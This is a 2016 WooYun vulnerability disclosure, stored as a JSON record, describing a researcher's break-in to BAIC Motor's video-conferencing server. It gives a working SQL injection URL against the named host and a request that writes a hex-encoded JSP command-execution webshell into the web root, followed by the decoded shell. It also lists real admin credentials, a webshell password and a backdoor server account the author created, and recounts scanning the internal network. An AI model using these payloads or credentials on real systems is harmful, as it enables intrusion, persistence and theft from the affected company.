{"id": 86879, "wybug_id": "wooyun-2016-0192291", "wybug_title": "我是如何测试北京汽车一系列内部服务安全的（dba权限/root帐号/内网遨游）", "wybug_corp": "北京汽车股份有限公司", "wybug_author": "DeadSea", "wybug_date": "2016-04-04 22:16", "wybug_open_date": "2016-05-20 10:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向公众公开  简要描述： mark 详细说明：  测试目标\nhttp://video.baicmotor.com\n发现是V2视频会议系统于是乎在乌云搜索了下。发现有人提交过一个sql注入外加getshell\nhttp://******/bugs/wooyun-2010-0143276\n注入出了root权限账户\n\n\nhttp://video.baicmotor.com/Conf/jsp/systembulletin/bulletinAction.do?operator=details&sysId=-1%20union%20select%201,user%28%29,3,version%28%29,5%23\n然后放到sqlmap跑下 后面加个leve 2 才能跑的出来，感谢zone的小伙伴出的主意\n\nroot权限。在跑下管理员帐号\nadmin/baic12345678\n成功进入后\n\n让我们研究研究getshell\nPOST /Conf/jsp/systembulletin/bulletinAction.do?operator=details HTTP/1.1Host: video.baicmotor.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8Content-Length: 1171Cookie: JSESSIONID=804BDEBF691850876C7B73972FE2024B; Hm_lvt_74a2fe33808be9e788342930391b2bf4=1459677986; JSESSIONID=FE67B91450FF759C19F39F7C8FBBA097Connection: keep-alivesysId=-1%20union%20select%200x3C2540207061676520636F6E74656E74547970653D22746578742F68746D6C3B20636861727365743D47424B2220253E0D0A3C2540207061676520696D706F72743D226A6176612E696F2E2A2220253E203C2520537472696E6720636D64203D20726571756573742E676574506172616D657465722822636D6422293B20537472696E67206F7574707574203D2022223B20696628636D6420213D206E756C6C29207B20537472696E672073203D206E756C6C3B20747279207B2050726F636573732070203D2052756E74696D652E67657452756E74696D6528292E6578656328636D64293B204275666665726564526561646572207349203D206E6577204275666665726564526561646572286E657720496E70757453747265616D52656164657228702E676574496E70757453747265616D282929293B207768696C65282873203D2073492E726561644C696E6528292920213D206E756C6C29207B206F7574707574202B3D2073202B225C725C6E223B207D207D20636174636828494F457863657074696F6E206529207B20652E7072696E74537461636B547261636528293B207D207D200D0A6F75742E7072696E746C6E286F7574707574293B253E,'','','','' into dumpfile '../../management/webapps/root/cmd.jsp'%23\n这段代码的意思就是把cmd.jsp写入root目录 因为都是默认的我想上传一句话，这个我弄了半天。最后才知道他是利用了16位进制加密\n3C2540207061676520636F6E74656E74547970653D22746578742F68746D6C3B20636861727365743D47424B2220253E0D0A3C2540207061676520696D706F72743D226A6176612E696F2E2A2220253E203C2520537472696E6720636D64203D20726571756573742E676574506172616D657465722822636D6422293B20537472696E67206F7574707574203D2022223B20696628636D6420213D206E756C6C29207B20537472696E672073203D206E756C6C3B20747279207B2050726F636573732070203D2052756E74696D652E67657452756E74696D6528292E6578656328636D64293B204275666665726564526561646572207349203D206E6577204275666665726564526561646572286E657720496E70757453747265616D52656164657228702E676574496E70757453747265616D282929293B207768696C65282873203D2073492E726561644C696E6528292920213D206E756C6C29207B206F7574707574202B3D2073202B225C725C6E223B207D207D20636174636828494F457863657074696F6E206529207B20652E7072696E74537461636B547261636528293B207D207D200D0A6F75742E7072696E746C6E286F7574707574293B253E\n解密后是\n<%@ page contentType=\"text/html; charset=GBK\" %><%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; if(cmd != null) { String s = null; try { Process p = Runtime.getRuntime().exec(cmd); BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream())); while((s = sI.readLine()) != null) { output += s +\"\\r\\n\"; } } catch(IOException e) { e.printStackTrace(); } } out.println(output);%>\n然后我就屁颠屁颠的跑去找了个jsp的一句话发现各种加密后上传不上去全是500然后想到了，可以利用html写个poc\n<form action=\"http://video.baicmotor.com/7.jsp?f=1.jsp\" method=\"post\"> <textarea name=c cols=120 rows=10 width=45>your code</textarea><BR><center><br> <input type=submit value=\"提交\"> </form>\n直接写入，\nhttp://video.baicmotor.com/s.jsp\n 密码023然后就是提权了\n\n幸福来的太突然了，sy权限，我呵呵了。你以为就这么简单吗？\n\n内网呀，大兄弟。我连内网是什么都不懂，所以问了几个朋友。跟我说了一些之后就操刀上马先转发端口到自己的服务器上\n\n在开启扫描器各种扫内网IP 10.10.1.1~10.10.1.255内部OA\n\n内部管理系统\n\n防泄漏系统\n\n还有122个内部系统就不一一贴出来了\n\n服务器帐号sea$ 密码sea 管理员记得删除    漏洞证明：  \n\n   修复方案：  打补丁   版权声明：转载请注明来源 DeadSea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2016-04-05 10:44 厂商回复： 感谢你的努力。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-06 01:04 |    \t\tDeadSea \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:62        | 本人外形俊朗、眉清目秀、玉树临风、有明星...)\t\t \n  告诉我为何只有5rank    \n     2016-04-25 10:52 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:322 漏洞数:58        | little red pig!)\t\t \n  感谢你的努力    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}